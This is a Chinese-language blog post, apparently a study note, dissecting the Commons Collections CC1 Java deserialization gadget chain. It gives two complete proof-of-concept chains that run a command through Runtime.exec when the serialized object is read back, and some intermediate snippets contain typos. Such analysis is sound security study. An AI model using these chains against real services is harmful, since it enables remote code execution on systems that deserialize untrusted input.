+++
title = 'java安全CC1链分析'
date = '2024-07-10T14:39:04+08:00'
categories = ['Java', '安全']
tags = ['cc链', 'java安全']
+++

## 1.前言

Apache Commons Collections 是 Apache 软件基金会的一个子项目，提供了许多有用的 Java 集合框架的实现和扩展。它旨在填补 Java 标准类库中集合框架的一些不足，并提供了一系列的集合实现和工具类，以帮助开发者更加方便地处理集合数据。

## 2.环境准备

### 影响版本

jdk版本：这里使用8u65版本(8u71之后已修复不可利用)
https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

CommonsCollections:这里使用3.2.1 (3.1 - 3.2.1)

```java
    <dependencies>
        <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
```

### 配置源码

因为jdk自带的包里面有些文件是反编译的.class文件，代码很难读懂，并且调试时候会出现一些问题，我们需要将它转换为.java文件，我们需要安装相应的源码。

下载地址：https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4

![image-20240427210550150](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272105233.png)

### 创建项目

#### pom.xml导入依赖

![image-20240427210636224](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272106270.png)

#### sdk设置

![image-20240427210714231](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272107271.png)

到此，准备工作就做完了，下面就开始分析啦。

## 3.链子分析

Transformer接口，找继承了Transformer接口的类。
![image-20240427214604732](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272146781.png)

这条链子的漏洞利用点在InvokerTransformer.transform()方法中，我们看一下这个方法。

![image-20240427211121399](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272111455.png)

可以明显的看到红色部分，这不就是一个反射吗？没错这就是一个反射进行任意方法的调用，我们再看一下这几个参数。

InvokerTransformer的构造方法:
![image-20240427211306015](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272113047.png)

从构造方法中知道，我们使用反射进行任意方法调用，这几个参数都是可以控制的。

我们先回顾一下使用反射弹出计算器的代码。。

```java
public class CC1My {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Runtime r=Runtime.getRuntime();//
        Class cl=r.getClass();
        Method method= cl.getMethod("exec", String.class);
        method.invoke(r,"calc");
    }
}
```

我们改成用InvokerTransformer.transform()弹出计算器

```java
public class CC1My {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Runtime r=Runtime.getRuntime();//
        new InvokerTransformer("exec",new Class[] {String.class}, new Object[]{"calc"}).transform(r);
    }
}
```

没问题，都能成功弹出计算器。

那么就是往上找，看哪个类中调用了transform方法，最好是去找`不同类的同名函数`。这里查找后能在TransformedMap.checkSetValue()方法中找到调用了transform

![image-20240427212831042](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272128075.png)

这个valueTransformer是构造方法中的

![image-20240427212901053](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272129085.png)

我们可以发现，TransformedMap的构造方法和checkSetValue方法修饰符都是protected，本类中可以用。但在这个类中有个decorate方法
![image-20240427214135566](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272141596.png)

这个方法实现了本类的一个实例化，并且参数都是可以控制的。现在去找哪里调用了checkSetValue方法，只有AbstractInputCheckedMapDecorator类中调用了，在静态内部类(MapEntry)的setValue方法中。
![image-20240427220143949](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202404272201994.png)

Entry是Map中的一个键值对，在Map中Entry下可以看到setValue方法，那么我们在对Map进行遍历的时候这样写：

```java
        for (Map.Entry entry:transformedMap.entrySet()){
            System.out.println(entry);
            entry.setValue(r);
        }
```

这样就会调用setValue方法了。然后就跳进了TransformedMap中调用checkSetValue，接着跳进InvokerTransformer中的transform方法，成功执行。

![image-20240520181624201](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202405201816287.png)

### 利用代码分析

```java
package top.foreverwl.study.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.ObjectName;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1My {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[] {String.class}, new Object[]{"calc"});
        Runtime r=Runtime.getRuntime();//
        HashMap<Object,Object> map =new HashMap<>();
//        map.put("test","test");
        map.put("168","168");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);

        for (Map.Entry entry:transformedMap.entrySet()){//获取 transformedMap每一个元素 每个元素作为一Map.Entry对象
            System.out.println(entry);
            entry.setValue(r);
        }

    }
}
```

分析弹出计算器的过程：

我们想要调用TransformedMap类中的checkSetValue方法，这样就能触发构造的命令，我们通过decorate方法来实例化这个类，先实例化一个HashMap，然后调用put方法添加一个键值对，然后将map作为参数实例化成transformedMap对象，这个对象为Map类型(由**TransformedMap**类装饰的**Map**)。接着对这个对象进行遍历，调用setValue方法，但是transformedMap中没有setValue，

下面就去找哪里调用了setValue()方法，好巧不巧，正好在AnnotationInvocationHandler类中一个叫readObject()的方法中调用了。

我们看这个类的构造函数：

```java
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }
```

第一个参数是继承了注解的Class，第二个参数为Map类型，我们可以控制，这里直接传入上边我们定义的transformedMap。

![image-20240709154040352](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407091540436.png)

可以看出AnnotationInvocationHandler这个类没有修饰符，也就是只能同一个包或者类内部使用，我们想要在外部使用他，这里就用反射解决这个问题。

```java
public class CC1My {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
      
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[] {String.class}, new Object[]{"calc"});
        Runtime r=Runtime.getRuntime();
        HashMap<Object,Object> map =new HashMap<>();
//        map.put("test","test");
        map.put("168","168");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);//修改作用域 能够访问非公共的成员
        Object o= constructor.newInstance(Override.class,transformedMap);//第一个参数为注解的类原型
        serialize(o);
        unserialize("ser.txt");
//        for (Map.Entry entry:transformedMap.entrySet()){
//            System.out.println(entry);
//            entry.setValue(r);
//        }
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.txt"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

这样是不能执行的，还需要解决一些问题。

### 问题

我们跟进到Runtime类，发现没有实现Serializable，也就是不能被序列化

![image-20240709162119107](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407091621166.png)

我们可以通过反射去获取Runtime的原型类，Class是实现了Serializable的，可以被序列化。

![image-20240709162332702](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407091623748.png)

```java
        Class runtime=Class.forName("java.lang.Runtime");
        Method getruntime=runtime.getMethod("getRuntime",null);
        Method exec=runtime.getDeclaredMethod("exec", String.class);
        Runtime rt= (Runtime) getruntime.invoke(null,null);
        exec.invoke(rt,"clac");
```

下面使用transform方法实现上边的代码:

```java
        Class runtime=Class.forName("java.lang.Runtime");
//        Method getruntime=runtime.getMethod("getRuntime",null);
//        Method exec=runtime.getDeclaredMethod("exec", String.class);
//        Runtime rt= (Runtime) getruntime.invoke(null,null);
//        exec.invoke(rt,"clac");
        //获取getRuntime方法
        Method getRuntime= (Method) new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getruntime",null}).transform(Runtime.class);
        //获取invoke方法
        Runtime rt= (Runtime) new InvokerTransformer("invoke",new Class[]{String.class,Class[].class},new Object[]{"getruntime",null}).transform(getRuntime);
        //执行命令
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"clac"}).transform(rt);
```

在Commons Collections库中存在的ChainedTransformer类，他的构造方法接收一个Transformer数组，我们可以将上边InvokerTransformer创建为一个Transformer数组，然后正好ChainedTransformer类中的transform方法能够遍历Transformer数组。

![image-20240710162405566](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101624646.png)

```java
        Transformer[] transformer = new Transformer[]{
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{String.class,Class[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"clac"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        chainedTransformer.transform(Runtime.class);
```

这样就解决了反序列的问题。但是运行还是不能执行命令。

我们调试看一下

![image-20240710172508125](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101725221.png)

这里memberType为空，第一个if就没过去。这个memberType就是获取注解名e为name的值，这个name就是memberValues的键名，那么memberValues是什么呢？就是我们传入的Map对象。

![image-20240710181037139](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101810210.png)

这个注解没有成员变量，发现在Target中存在注解

![image-20240710181126989](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101811038.png)

这样我们就有value值了，我们在对map put键值对时候，键名要为vlaue键值随便。

![image-20240710181802256](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101818322.png)

这边可以看到值不为空了，我们再往下看

![image-20240710184436214](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101844276.png)

这个value不是我们想要的Runtime.class，这里就需要**ConstantTransformer**类了，我们看一下这个类

![image-20240710184641291](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101846345.png)

可以看到这个构造函数，和transform结合使用，我们传入什么就返回什么。我们将value值设置为Runtime.class

![image-20240710184823356](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407101848413.png)

### 第一条链子

```java
package top.foreverwl.study.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1My {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        HashMap<Object, Object> map = new HashMap<>();
//        map.put("test","test");
        map.put("value", "168");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.txt");
    }
   public static void serialize(Object object) throws IOException {
       FileOutputStream fileOutputStream = new FileOutputStream("ser.txt");
       ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
       objectOutputStream.writeObject(object);
       System.out.println("1.序列化成功");
}
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(filename);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("2.反序列化成功");
    }
}
```

### 另一条链子

在ysoserial源码给出的链子，是使用了LazyMap中的get方法，这个方法也调用了transform。但是sun.reflect.annotation.AnnotationInvocationHandler中的readobject没有调用Map的get方法，但是AnnotationInvocationHandler类的invoke方法有调用到get。这里直接给出链子，不再分析了

```java
package top.foreverwl.study.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CCtest03 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        //恶意攻击类，命令执行
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotation = c.getDeclaredConstructor(Class.class,Map.class);
        annotation.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
                annotation.newInstance(Retention.class, outerMap);
        Map proxMap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
        handler = (InvocationHandler)
                annotation.newInstance(Retention.class, proxMap);
        serialize(handler);
        unserialize("web.bin");
    }

    public static void serialize(Object object) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("web.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("1.序列化成功");
    }

    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(filename);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("2.反序列化成功");
    }
}
```



## 4.结语

第一次分析完这个链子，断断续续有段时间了，今天终于把他完成了。文章可能逻辑不是很清晰，目前先这样，继续学习，之后再将不足的地方进行修改。
